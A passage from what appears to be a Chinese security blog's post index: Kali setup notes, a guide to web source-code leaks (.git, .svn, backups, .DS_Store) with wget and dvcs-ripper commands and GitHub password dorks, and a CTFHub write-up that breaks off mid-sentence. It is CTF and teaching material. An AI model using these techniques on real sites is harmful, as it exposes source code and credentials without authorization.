class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pytesseract<br><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br>image = Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;1.jpg&quot;</span>)<br>text = pytesseract.image_to_string(image,lang=<span class="hljs-string">&#x27;chi_sim&#x27;</span>)  <span class="hljs-comment">#使用简体中文解析图片</span><br><span class="hljs-built_in">print</span>(text)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Kali</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux</tag>
      
      <tag>Python</tag>
      
      <tag>Kali</tag>
      
      <tag>tesseract</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>kali(64位)编译32位程序</title>
    <link href="/2021/08/09/Linux/Kali/kali%E7%BC%96%E8%AF%9132%E4%BD%8D%E7%A8%8B%E5%BA%8F/"/>
    <url>/2021/08/09/Linux/Kali/kali%E7%BC%96%E8%AF%9132%E4%BD%8D%E7%A8%8B%E5%BA%8F/</url>
    
    <content type="html"><![CDATA[<h2 id="kali-64位-编译32位程序"><a href="#kali-64位-编译32位程序" class="headerlink" title="kali(64位)编译32位程序"></a>kali(64位)编译32位程序</h2><p><strong>编译 32 位程序出错：</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell">┌──(kali㉿kali)-[~/StackOverflowtest]<br>└─$ gcc -g -z execstack -no-pie -m32 -o bof bof.c                                    1 ⨯<br>In file included from bof.c:1:<br>/usr/include/string.h:26:10: fatal error: bits/libc-header-start.h: No such file or directory<br>   26 | #include &lt;bits/libc-header-start.h&gt;<br>      |          ^~~~~~~~~~~~~~~~~~~~~~~~~~<br>compilation terminated.<br></code></pre></td></tr></table></figure><p><strong>安装 gcc-multilib ：</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell">┌──(kali㉿kali)-[~/StackOverflowtest]<br>└─$ sudo apt install gcc-multilib<br>[sudo] password for kali: <br>Reading package lists... Done<br>Building dependency tree... Done<br>Reading state information... Done<br><br>┌──(kali㉿kali)-[~/StackOverflowtest]<br>└─$ gcc -g -z execstack -no-pie -m32 -o bof bof.c<br></code></pre></td></tr></table></figure><p><strong>参考：</strong></p><p>你系统中 gcc 没有安装 multilib 库；使用这个库可以在 64 位的机器上产生 32 位的程序或者库文件；</p><p>你可以选择：<code>apt install gcc-multilib</code> 进行完善安装；也可以只编译特定平台的文件: 例如 <code>make x86_64</code> ； 具体编译的目标，请查看 Makefile 文件进行阅读；</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> sudo apt-get install gcc-multilib</span><br><span class="hljs-meta">$</span><span class="bash"> sudo apt-get install gcc-x.x-multilib</span><br><span class="hljs-meta">$</span><span class="bash"> sudo apt-get install g++-x.x-multilib</span><br></code></pre></td></tr></table></figure><p>原文链接：<a href="https://blog.csdn.net/qq_15269787/article/details/122389815">https://blog.csdn.net/qq_15269787/article/details/122389815</a></p>]]></content>
    
    
    <categories>
      
      <category>Kali</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux</tag>
      
      <tag>Kali</tag>
      
      <tag>32位</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>常见Web源码泄露</title>
    <link href="/2021/08/08/CTF/Web/Notes/%E5%B8%B8%E8%A7%81Web%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/"/>
    <url>/2021/08/08/CTF/Web/Notes/%E5%B8%B8%E8%A7%81Web%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/</url>
    
    <content type="html"><![CDATA[<p>Web源码泄露的漏洞：</p><ul><li>Git源码泄露</li><li><p>SVN源码泄露</p></li><li><p>HG源码泄漏</p></li><li>CVS泄露</li><li>Bazaar/bzr泄露</li><li>网站备份压缩文件</li><li><code>WEB-INF/web.xml</code> 泄露</li><li>DS_Store 文件泄露</li><li>SWP 文件泄露</li><li>GitHub源码泄漏</li></ul><h2 id="Git-源码泄露"><a href="#Git-源码泄露" class="headerlink" title="Git 源码泄露"></a>Git 源码泄露</h2><p>Git 是一个开源的分布式版本控制系统，在执行 <code>git init</code> 初始化目录的时候，会在当前目录下自动创建一个 <code>.git</code> 目录，用来记录代码的变更记录等。发布代码的时候，如果没有把 <code>.git</code> 这个目录删除，就直接发布到了服务器上，攻击者就可以通过它来恢复源代码。</p><p><strong>常规 git 泄露：</strong><br>使用工具读出源码即可 。</p><p><strong>git 回滚：</strong><br><code>git</code> 会记录每次的提交的修改，在比赛中拿到的 <code>flag</code> 文件有可能是被删除或者覆盖过的，这时可以用 <code>git log</code> 查看提交日志信息，再利用 <code>git reset --hard commit-id</code> 来恢复到以前的版本，也可以用 <code>git diff commit-id</code> 比较版本的差异 。</p><p><strong>git 分支：</strong><br>每次提交，<code>git</code> 都会将她们串为一条时间线，这条时间线就是一条分支，<code>git</code> 允许有多条分支，则需要的 <code>flag</code> 文件有可能不在主分支即 <code>master</code> 上，而 <code>git log</code> 只能看到当前分支的 。<br>对于 <code>获取其他的分支、tag</code> ，都可以从 <code>/.git/refs/heads</code> 、<code>/.git/refs/tag</code> 里面拿到 <code>最新的 commit 对象 id</code> ，然后就是顺着这个可以爬到 <code>parent commit</code> ，假设获取 <code>master</code>，<code>最新的 commit 的 object id</code> 可以在 <code>/.git/refs/heads/master</code> 获取到 。</p><p><strong>其他利用方式：</strong><br>从 <code>.git/config</code> 可能有 <code>access_token</code> 信息， 从而访问这个用户的其他的仓库 。<br>在访问 <code>.git</code> 的时候有可能会返回 <code>403</code>，此时可以试着访问 <code>.git/config</code> ，若有文件返回则有可能存在泄露。</p><p><strong>利用方法：</strong></p><p>常规的利用方法就是下载整个目录, 然后用 <code>git</code> 命令回滚整个项目:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> wget --mirror --include-directories=/.git http://www.target.com/.git</span><br><span class="hljs-meta">#</span><span class="bash"> <span class="hljs-built_in">cd</span> www.target.com</span> <br><span class="hljs-meta">#</span><span class="bash"> git reset --hard</span><br></code></pre></td></tr></table></figure><p>或者</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> wget -r --no-parent --mirror http://www.example.com/.git</span><br><span class="hljs-meta">#</span><span class="bash"> <span class="hljs-built_in">cd</span> www.example.com &amp;&amp; git reset --hard</span> <br></code></pre></td></tr></table></figure><p>当然也有一些自动化利用的脚本 。</p><p><strong>漏洞利用工具：</strong></p><p><strong>1、GitHack</strong></p><p>GitHack 是一个 <code>.git</code> 泄露利用工具，可还原历史版本 。</p><p>github项目地址：<a href="https://github.com/lijiejie/GitHack">https://github.com/lijiejie/GitHack</a> （只是下载，无法进行版本切换和贮存弹出）</p><p>github项目地址：<a href="https://github.com/BugScanTeam/GitHack">https://github.com/BugScanTeam/GitHack</a> （初始目录是无文件的）</p><p>用法示例：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> python2 GitHack.py http://www.example.com/.git/</span><br></code></pre></td></tr></table></figure><p><strong>2、Scrabble</strong></p><p>可进行版本切换，无法进行贮存弹出</p><p>github项目地址：<a href="https://github.com/denny0223/scrabble">https://github.com/denny0223/scrabble</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> ./scrabble http://example.com/</span><br></code></pre></td></tr></table></figure><p>注意：源码下载可能会覆盖所在目录的文件，所以最好在空目录下使用 。</p><p><strong>3、dvcs-ripper</strong></p><p>github项目地址： <a href="https://github.com/kost/dvcs-ripper">https://github.com/kost/dvcs-ripper</a></p><p>用法示例：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> perl rip-git.pl -s -v -u http://www.example.com/.git/</span><br></code></pre></td></tr></table></figure><h2 id="SVN源码泄露"><a href="#SVN源码泄露" class="headerlink" title="SVN源码泄露"></a>SVN源码泄露</h2><p>SVN 是一个开放源代码的版本控制系统。在使用 SVN 管理本地代码过程中，会自动生成一个名为 <code>.svn</code> 的隐藏文件夹，其中包含重要的源代码信息。网站管理员在发布代码时，没有使用 “导出” 功能，而是直接复制代码文件夹到 WEB 服务器上，这就使 <code>.svn</code> 隐藏文件夹被暴露于外网环境，可以利用 <code>.svn/entries</code> 文件，获取到服务器源码。</p><p><strong>利用方法：</strong></p><p>同样是先下载目录, 然后回滚：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> wget -r --no-parent --mirror http://www.example.com/.svn</span><br><span class="hljs-meta">#</span><span class="bash"> <span class="hljs-built_in">cd</span> www.example.com &amp;&amp; svn revert --recursive .</span> <br></code></pre></td></tr></table></figure><p><strong>漏洞利用工具：</strong></p><p><strong>1、Seay-SVN</strong></p><p>法师的工具，基于 Windows 平台</p><p><strong>2、dvcs-ripper</strong></p><p>支持旧版和新版的 svn 。</p><p>github项目地址： <a href="https://github.com/kost/dvcs-ripper">https://github.com/kost/dvcs-ripper</a></p><p>用法示例：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> perl rip-svn.pl -v -u http://www.example.com/.svn/</span><br></code></pre></td></tr></table></figure><h2 id="HG源码泄漏"><a href="#HG源码泄漏" class="headerlink" title="HG源码泄漏"></a>HG源码泄漏</h2><p>Mercurial 是一种轻量级分布式版本控制系统，使用 <code>hg init</code> 的时候会生成 <code>.hg</code> 。</p><p><strong>利用方法：</strong></p><p>下载 + 回滚：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> wget -r --no-parent --mirror http://www.example.com/.hg</span><br><span class="hljs-meta">#</span><span class="bash"> <span class="hljs-built_in">cd</span> www.example.com &amp;&amp; hg revert</span> <br></code></pre></td></tr></table></figure><p><strong>漏洞利用工具： dvcs-ripper</strong><br>github项目地址： <a href="https://github.com/kost/dvcs-ripper">https://github.com/kost/dvcs-ripper</a></p><p>用法示例：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> perl rip-hg.pl -v -u http://www.example.com/.hg/</span><br></code></pre></td></tr></table></figure><h2 id="CVS泄露"><a href="#CVS泄露" class="headerlink" title="CVS泄露"></a>CVS泄露</h2><p>CVS 是一个 C/S 系统，多个开发人员通过一个中心版本控制系统来记录文件版本，从而达到保证文件同步的目的。主要是针对 <code>CVS/Root</code> 以及 <code>CVS/Entries</code> 目录，分别记录了项目的根信息和所有文件的结构，直接就可以看到泄露的信息。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">http://url/CVS/Root</span>    <span class="hljs-comment">#返回根信息 </span><br><span class="hljs-string">http://url/CVS/Entries</span> <span class="hljs-comment">#返回所有文件的结构</span><br></code></pre></td></tr></table></figure><p><strong>利用方法：</strong></p><p>下载 CVS 文件夹然后通过 cvs 命令获取源码信息，不过似乎没有直接的回滚操作，需要做点额外的处理 。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> wget -r --no-parent --mirror http://www.example.com/CVS</span><br><span class="hljs-meta">#</span><span class="bash"> <span class="hljs-built_in">cd</span> www.example.com &amp;&amp; cvs diff *</span> <br></code></pre></td></tr></table></figure><p><strong>漏洞利用工具：dvcs-ripper</strong><br>github项目地址：<a href="https://github.com/kost/dvcs-ripper.git">https://github.com/kost/dvcs-ripper.git</a></p><p>运行示例:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> perl rip-cvs.pl -v -u http://www.example.com/CVS/</span><br></code></pre></td></tr></table></figure><h2 id="Bazaar-bzr泄露"><a href="#Bazaar-bzr泄露" class="headerlink" title="Bazaar/bzr泄露"></a>Bazaar/bzr泄露</h2><p>bzr 也是个版本控制工具, 虽然不是很热门, 但它也是多平台支持, 并且有不错的图形界面。</p><p><strong>利用方法：</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> wget -r --no-parent --mirror http://www.example.com/.bzr</span><br><span class="hljs-meta">#</span><span class="bash"> <span class="hljs-built_in">cd</span> www.example.com &amp;&amp; bzr revert</span><br></code></pre></td></tr></table></figure><p><strong>漏洞利用工具：dvcs-ripper</strong><br>github项目地址：<a href="https://github.com/kost/dvcs-ripper.git">https://github.com/kost/dvcs-ripper.git</a></p><p>运行示例：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> perl rip-bzr.pl -v -u http://www.example.com/.bzr/</span><br></code></pre></td></tr></table></figure><h2 id="备份文件泄露"><a href="#备份文件泄露" class="headerlink" title="备份文件泄露"></a>备份文件泄露</h2><p>备份文件泄露又分为两种情况，一种是运维人员偷懒地直接在网站根目录用类似 <code>tar -czvf bakup.tgz *</code> 的命令将网站进行备份，这样整站的源代码都能直接被用户打包下载了；另一种是开发或者运维人员使用的编辑器修改文件时自动备份了所编辑的网页内容，如 vim 的 <code>.swp</code> ，从而泄露了该网页的源代码 。</p><p><strong>常见的备份文件后缀：</strong></p><ul><li>.rar</li><li>.zip</li><li>.7z</li><li>.tar.gz</li><li>.bak</li><li>.swp</li><li>.txt</li><li>.html</li><li>.old</li><li>.temp</li></ul><p><strong>gedit</strong></p><p>Linux 下用 gedit 编写文件并保存后会生成一个文件名格式为 <code>原文件名~</code> 的备份文件 。</p><p><strong>vim</strong></p><p>当使用 vim 编辑文件第一次意外退出时会生成一个文件名格式为 <code>.文件名.swp</code> 的备份文件，可使用 <code>vim -r 文件名</code> 来恢复，第二次意外退出为 <code>.swo</code>，第三次为 <code>.swn</code> 。</p><p><strong>常规文件</strong></p><p><code>robots.txt</code>：敏感目录和 CMS 版本信息<br><code>readme.md</code>：CMS 版本信息，github 地址<br><code>www.zip/rar/tar.gz</code>：网站备份源码</p><p><strong>利用方法：</strong></p><p>对于打包文件而言，可以用 <code>&#123;常用文件名&#125; + &#123;常用压缩包后缀&#125;</code> 的方式扫描网站，说不定会有意外惊喜。对于网页的临时备份文件，可以扫描对应页面的 <code>.swp</code> 或者 <code>.bak</code> 等后缀，说不定也能找到有用的信息 。</p><p><strong>漏洞利用工具：</strong></p><p><strong>1、disearch</strong></p><p>github项目地址：<a href="https://github.com/maurosoria/dirsearch">https://github.com/maurosoria/dirsearch</a></p><p>用法示例：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> python3 dirsearch.py -u URL -e extension</span><br></code></pre></td></tr></table></figure><p><strong>2、御剑</strong></p><h2 id="SWP-文件泄露"><a href="#SWP-文件泄露" class="headerlink" title="SWP 文件泄露"></a>SWP 文件泄露</h2><p><code>swp</code> 即 <code>swap</code> 文件，在编辑文件时产生的临时文件，它是隐藏文件，如果程序正常退出，临时文件自动删除，如果意外退出就会保留，文件名为 <code>.filename.swp</code> 。</p><p>漏洞利用：直接访问 <code>.swp</code> 文件，下载回来后删掉末尾的 <code>.swp</code> ，获得源码文件。</p><h2 id="配置文件泄露"><a href="#配置文件泄露" class="headerlink" title="配置文件泄露"></a>配置文件泄露</h2><p>现代 WEB 开发往往不会重新造轮子，而是基于成熟的框架进行配置，如果渗透测试人员知道该网站是基于什么类型的框架，就可能通过该框架的文档获得重要配置文件的路径，如果是开源框架，同时也能获得源代码，因此配置文件泄露的严重性也是不言而喻的 。</p><p><strong>利用方法：</strong></p><p>通过识别网站指纹得知其框架类型，然后手工测试重要的配置文件是否可以获取。如果是批量测试，则可以事先准备好 常见的配置文件路径，如 <code>wordpress</code> 的 <code>/wp-config.php</code> 等，组织成 <code>字典</code> 然后用脚本进行批量测试。<br>可以参考 <a href="https://github.com/ring04h/weakfilescan/blob/master/dict/configfile.lst">猪猪侠的字典</a> 。</p><h2 id="WEB-INF-web-xml-泄露"><a href="#WEB-INF-web-xml-泄露" class="headerlink" title="WEB-INF/web.xml 泄露"></a>WEB-INF/web.xml 泄露</h2><p><code>WEB-INF</code> 是 Java 的 WEB 应用的安全目录，如果想在页面中直接访问其中的文件，必须通过 <code>web.xml</code> 文件对要访问的文件进行相应映射才能访问。</p><p><code>WEB-INF</code> 主要包含以下文件或目录：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">WEB-INF/web.xml:</span> <span class="hljs-string">Web应用程序配置文件,</span> <span class="hljs-string">描述了servlet和其他的应用组件配置及命名规则</span><br><span class="hljs-attr">WEB-INF/database.properties:</span> <span class="hljs-string">数据库配置文件</span><br><span class="hljs-attr">WEB-INF/classes/:</span> <span class="hljs-string">一般用来存放Java类文件(.class)</span><br><span class="hljs-attr">WEB-INF/lib/:</span> <span class="hljs-string">用来存放打包好的库(.jar)</span><br><span class="hljs-attr">WEB-INF/src/:</span> <span class="hljs-string">用来放源代码(.asp和.php等)</span><br></code></pre></td></tr></table></figure><p>通过找到 <code>web.xml</code> 文件，推断 <code>class</code> 文件的路径，最后得到 <code>class</code> 文件，再通过反编译 <code>class</code> 文件，得到网站源码。</p><h2 id="DS-Store-文件泄露"><a href="#DS-Store-文件泄露" class="headerlink" title="DS_Store 文件泄露"></a>DS_Store 文件泄露</h2><p><code>.DS_Store</code> (Desktop Services Store) 是 macOS 目录下的隐藏文件，包含了当前目录结构和一些的自定义信息，如背景和图标位置等，在 windows 下类似的文件为 <code>desktop.ini</code> 。暴露了 <code>.DS_Store</code> 文件也就相当于暴露了该目录下的所有内容。通过 <code>.DS_Store</code> 可以知道这个目录里面所有文件的清单。</p><p><strong>漏洞利用工具：</strong></p><p><strong>1、ds_store_exp</strong></p><p>github项目地址：<a href="https://github.com/lijiejie/ds_store_exp">https://github.com/lijiejie/ds_store_exp</a> （有问题：python2-显示缺少库，但已经装了；python3-显示有语法错误）</p><p>github项目地址：<a href="https://github.com/meme-lord/ds_store_exp">https://github.com/meme-lord/ds_store_exp</a></p><p>用法示例：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> python ds_store_exp.py http://www.example.com/.DS_Store</span><br></code></pre></td></tr></table></figure><p><strong>2、Python-dsstore</strong></p><p>github项目地址：<a href="https://github.com/gehaxelt/Python-dsstore">https://github.com/gehaxelt/Python-dsstore</a></p><p>用法示例：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> python main.py DS_Store</span><br></code></pre></td></tr></table></figure><h2 id="GitHub源码泄漏"><a href="#GitHub源码泄漏" class="headerlink" title="GitHub源码泄漏"></a>GitHub源码泄漏</h2><p>GitHub 是一个面向开源及私有软件项目的托管平台。很多人喜欢把自己的代码上传到平台托管，通过关键词进行搜索，可以找到关于目标站点的敏感信息，甚至可以下载网站源码。</p><p>类似的代码托管平台还有很多，人才是最大的漏洞。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">https://github.com/search?q=smtp+user+@qq.com&amp;type=code<br></code></pre></td></tr></table></figure><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">site:<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Github</span>.</span></span>com smtp <br>site:<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Github</span>.</span></span>com sa password<br>site:<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Github</span>.</span></span>com root password<br>site:<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Github</span>.</span></span>com User ID=&#x27;sa&#x27;;Password<br>site:<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Github</span>.</span></span>com svn<br>site:<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Github</span>.</span></span>com ftp<br></code></pre></td></tr></table></figure><h2 id="Banner识别"><a href="#Banner识别" class="headerlink" title="Banner识别"></a>Banner识别</h2><p>1、利用 CMS 指纹库：<a href="http://whatweb.bugscaner.com/">在线识别</a> 。</p><p>2、利用已有工具 wappalyer，可以通过 python 安装库，也可以在浏览器装插件 。</p><p>3、还可以通过报错 404 和 302 来查看错误信息 。</p><h2 id="Windows-IIS-Apache-目录穿越"><a href="#Windows-IIS-Apache-目录穿越" class="headerlink" title="Windows IIS / Apache 目录穿越"></a>Windows IIS / Apache 目录穿越</h2><p>目录穿越漏洞原理比较简单，程序在实现上没有充分过滤用户输入的 <code>../</code> 之类的目录跳转符，导致恶意用户可以访问 web 根目录的上级从而遍历服务器上的任意文件。虽然 web 服务器本身会禁止访问 web 文件夹以外的地方，但如果是智障开发引入的动态页面，又没有过滤好用户输入，就可能会出现穿越甚至目录遍历。甚至 web 服务器本身也曾经有类似的漏洞，比如 Apache Tomcat 的 UTF-8 解析漏洞，具体利用和绕过可以参考 <a href="https://zhuanlan.zhihu.com/p/21516413">其他网上的文章</a> ，这里限于篇幅就不展开了 。</p><h2 id="Nginx配置安全"><a href="#Nginx配置安全" class="headerlink" title="Nginx配置安全"></a>Nginx配置安全</h2><p>Nginx 的配置选项之多，并不是所有人都能熟悉，但不表示随便百度一下复制粘贴就配置了，最好还是先看下官方文档对应选项的作用和用法，可以避免许多致命的错误。例如 Nginx 在代理静态文件时，如果不小心在配置文件中写错了一个字符：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">location</span> <span class="hljs-string">/static</span> &#123;<br><span class="hljs-string">alias</span> <span class="hljs-string">/home/web/static/;</span> <br>&#125; <br></code></pre></td></tr></table></figure><p>就会导致访问 <code>http://example.com/static../</code> 时可以访问上级目录，从而访问到敏感的信息。关于 nginx 配置安全， <a href="https://www.leavesongs.com/PENETRATION/nginx-insecure-configuration.html">离别歌的这篇文章</a> 其实写得很不错，值得每个开发和运维人员仔细了解 。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><section class="footnotes"><div class="footnote-list"><ol><li><span id="fn:1" class="footnote-text"><span><a href="https://www.cnblogs.com/xiaozi/p/12397114.html">常见的Web源码泄漏漏洞及其利用 - Bypass - 博客园 (cnblogs.com)</a><a href="#fnref:1" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:2" class="footnote-text"><span><a href="https://blog.csdn.net/qq_43271194/article/details/109312519">CTF中的Web信息搜集_Amire0x的小乐园-CSDN博客</a><a href="#fnref:2" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:3" class="footnote-text"><span><a href="https://evilpan.com/2017/09/22/web-file-disclosure/#配置文件泄露">WEB中的敏感文件泄漏 - evilpan</a><a href="#fnref:3" rev="footnote" class="footnote-backref"> ↩</a></span></span></li></ol></div></section>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>Web</tag>
      
      <tag>Leakage</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CTFHub-Web-信息泄露</title>
    <link href="/2021/08/08/CTF/Web/Write-up/CTFHub-Web-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/"/>
    <url>/2021/08/08/CTF/Web/Write-up/CTFHub-Web-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/</url>
    
    <content type="html"><![CDATA[<h2 id="1、目录遍历"><a href="#1、目录遍历" class="headerlink" title="1、目录遍历"></a>1、目录遍历</h2><p>1）直接手动遍历，得到 flag：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ctfhub</span>&#123;a<span class="hljs-number">5</span>b<span class="hljs-number">8</span>e<span class="hljs-number">8</span>d<span class="hljs-number">63</span>b<span class="hljs-number">093</span>a<span class="hljs-number">694</span>ca<span class="hljs-number">4318</span>b&#125;<br></code></pre></td></tr></table></figure><p>2）Requests 库</p><h2 id="2、PHPINFO"><a href="#2、PHPINFO" class="headerlink" title="2、PHPINFO"></a>2、PHPINFO</h2><p>1）直接找</p><p>2）<code>Ctrl+F</code> 打开查找，输入并搜索 flag ，得到 flag：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ctfhub</span>&#123;<span class="hljs-number">45</span>f<span class="hljs-number">70</span>ffa<span class="hljs-number">6</span>cd<span class="hljs-number">795</span>e<span class="hljs-number">0948</span>e<span class="hljs-number">9</span>fa<span class="hljs-number">5</span>&#125;<br></code></pre></td></tr></table></figure><h2 id="3、备份文件下载"><a href="#3、备份文件下载" class="headerlink" title="3、备份文件下载"></a>3、备份文件下载</h2><h3 id="1）网站源码"><a href="#1）网站源码" class="headerlink" title="1）网站源码"></a>1）网站源码</h3><p>题目给出常见的网站源码备份文件名和后缀，所以文件一定在其中两个组合中。可以通过<code>遍历</code>找出文件，也可以通过 <code>disearch</code> 或<code>御剑</code>扫描出文件。</p><p><code>dirsearch</code> 扫描命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> python dirsearch.py -u http://challenge-8fecf8af902f41f7.sandbox.ctfhub.com:10800/ -e *</span><br></code></pre></td></tr></table></figure><p>扫描出 <code>www.zip</code> 文件，URL 访问下载，发现压缩包中有名为 <code>flag_377715964.txt</code> 的文件，打开查看，内容为：<code>where is flag ??</code> ，尝试用 URL 直接访问文件 。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">http://challenge-8fecf8af902f41f7.sandbox.ctfhub.com:10800/www.zip</span>             <span class="hljs-comment">#访问下载www.zip</span><br><span class="hljs-string">http://challenge-8fecf8af902f41f7.sandbox.ctfhub.com:10800/flag_377715964.txt</span>  <span class="hljs-comment">#用URL直接访问文件</span><br></code></pre></td></tr></table></figure><p>得到 flag：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">ctfhub&#123;c2e8849c26142934698534ae&#125;</span><br></code></pre></td></tr></table></figure><h3 id="2）bak文件"><a href="#2）bak文件" class="headerlink" title="2）bak文件"></a>2）bak文件</h3><p>题目提示 <code>Flag in index.php source code</code> ，访问 <code>/index.php</code> ，没有东西，题目又是 <code>bak文件</code> ，flag 可能在 <code>.bak</code> 里面，URL 访问 <code>index.php.bak</code> ，下载得到源码，flag 在源码里 。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ctfhub</span>&#123;<span class="hljs-number">78</span>bdc<span class="hljs-number">17</span>ad<span class="hljs-number">65801</span>bdbf<span class="hljs-number">3</span>fc<span class="hljs-number">26</span>d&#125;<br></code></pre></td></tr></table></figure><h3 id="3）vim缓存"><a href="#3）vim缓存" class="headerlink" title="3）vim缓存"></a>3）vim缓存</h3><p>题目提示 <code>flag 在 index.php 源码中</code> ，访问 <code>/index.php</code> ，没有东西，题目又是 <code>vim缓存(临时文件)</code> ，所以是 <code>SWP文件</code> ，flag 可能在 <code>.index.php.swp</code> 